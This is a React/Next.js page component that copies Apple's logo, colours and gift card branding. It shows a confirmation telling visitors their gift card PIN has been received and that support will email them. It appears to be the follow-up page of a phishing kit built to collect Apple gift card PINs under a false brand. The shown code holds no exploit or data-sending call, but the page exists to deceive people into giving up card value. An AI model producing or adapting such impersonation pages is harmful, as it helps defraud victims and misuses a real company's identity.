import Link from 'next/link';
import { Navbar, Container } from 'react-bootstrap';

export default function handlecheck() {
  return (
    <div
      className="main-wrapper"
      style={{
        minHeight: '100vh',
        display: 'flex',
        flexDirection: 'column',
        background: '#fff'
      }}
    >
      {/* Header */}
      <header>
        <Navbar className="custom-navbar" variant="light" expand="lg">
          <Container fluid style={{ paddingLeft: '2rem', paddingRight: '2rem' }}>
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              width: '100%'
            }}>
              {/* Left: Apple Logo */}
              <Link href="/" passHref legacyBehavior>
                <Navbar.Brand style={{ padding: 0 }}>
                  <img
                    src="/appleLogo.jpg"
                    alt="Apple Logo"
                    style={{ height: '40px', width: 'auto', display: 'block' }}
                  />
                </Navbar.Brand>
              </Link>
              {/* Right: Search and Hamburger */}
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '2rem'
              }}>
                <button
                  style={{
                    background: 'none',
                    border: 'none',
                    padding: 0,
                    margin: 0,
                    cursor: 'pointer',
                    fontSize: '1.5rem',
                    color: '#222'
                  }}
                  aria-label="Search"
                  onClick={() => window.open('https://www.apple.com/us/search', '_blank')}
                >
                  <i className="bi bi-search"></i>
                </button>
                <button
                  style={{
                    background: 'none',
                    border: 'none',
                    padding: 0,
                    margin: 0,
                    cursor: 'pointer',
                    fontSize: '1.7rem',
                    color: '#222'
                  }}
                  aria-label="Menu"
                >
                  <i className="bi bi-list"></i>
                </button>
              </div>
            </div>
          </Container>
        </Navbar>
      </header>

      {/* Responsive Div */}
      <main
        className="main-content"
        style={{
          flex: 1,
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'flex-start',
          width: '100%',
          paddingLeft: 0,
          paddingRight: 0,
          background: '#fff'
        }}
      >
        <div className="responsive-row">
          {/* Left: Heading */}
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', padding: '15px' }}>
            <h1 className="giftcard-heading" style={{ fontWeight: 'bold', marginBottom: 0, textAlign: 'left' }}>Apple gift card</h1>
          </div>
          {/* Right side intentionally left blank */}
        </div>
        {/* Divider */}
        <hr style={{ width: '100%', margin: 0, borderTop: '1.5px solid #ddd' }} />
        {/* Centered message */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          flex: 1,
          minHeight: '350px',
          background: 'linear-gradient(135deg, #f5f5f7 0%, #e9e9ee 100%)',
          borderRadius: '24px',
          boxShadow: '0 4px 24px rgba(0,0,0,0.07)',
          margin: '2rem auto',
          maxWidth: '600px',
          padding: '2.5rem 2rem'
        }}>
          <img src="/appleLogo.png" alt="Apple Logo" style={{ width: 60, height: 60, marginBottom: 24, borderRadius: '50%', background: '#fff', boxShadow: '0 2px 8px rgba(0,0,0,0.06)' }} />
          <h2 style={{ fontWeight: 'bold', fontSize: '2rem', margin: '0 0 1.2rem 0', textAlign: 'center', color: '#222' }}>
            We will get back to you shortly via email
          </h2>
          <p style={{ fontSize: '1.15rem', color: '#444', textAlign: 'center', maxWidth: '500px', marginBottom: 24 }}>
            Thank you for inputing your pin. Our support team will review your request and contact you at your registered email address soon.<br /><br />
            <span style={{ color: '#0071e3', fontWeight: 500 }}>You can close this page or return to the home page.</span>
          </p>
          <Link href="/" passHref legacyBehavior>
            <button style={{
              background: '#0071e3',
              color: '#fff',
              border: 'none',
              borderRadius: 26,
              fontWeight: 'bold',
              fontSize: '1.1rem',
              padding: '0.9rem 2.5rem',
              cursor: 'pointer',
              marginTop: 8
            }}>Go to Home</button>
          </Link>
        </div>
      </main>

      {/* Footer */}
      <footer
        style={{
          width: '100vw',
          background: '#f5f5f7',
          marginTop: '2.5rem',
          padding: '1.2rem 0',
          display: 'flex',
          justifyContent: 'center',
          borderTop: '1px solid #e0e0e0',
          position: 'relative',
          left: '50%',
          transform: 'translateX(-50%)'
        }}
      >
        <div
          style={{
            width: '100%',
            maxWidth: '900px',
            display: 'flex',
            alignItems: 'center',
            gap: '1.2rem',
            paddingLeft: '0.5rem'
          }}
        >
          {/* Apple logo */}
          <img
            src="/appleLogo.jpg"
            alt="Apple Logo"
            style={{ height: '28px', width: 'auto', display: 'block' }}
          />
          {/* Divider */}
          <span style={{
            display: 'inline-block',
            width: '1px',
            height: '22px',
            background: '#ccc',
            margin: '0 1.2rem'
          }} />
          {/* Support text */}
          <span style={{ color: '#222', fontSize: '1rem', fontWeight: 500 }}>Support</span>
          {/* Divider */}
          <span style={{
            display: 'inline-block',
            width: '1px',
            height: '22px',
            background: '#ccc',
            margin: '0 1.2rem'
          }} />
          {/* Check your gift card balance text */}
          <span style={{ color: '#222', fontSize: '1rem', fontWeight: 500 }}>Check your gift card balance</span>
        </div>
      </footer>
    </div>
  );
}
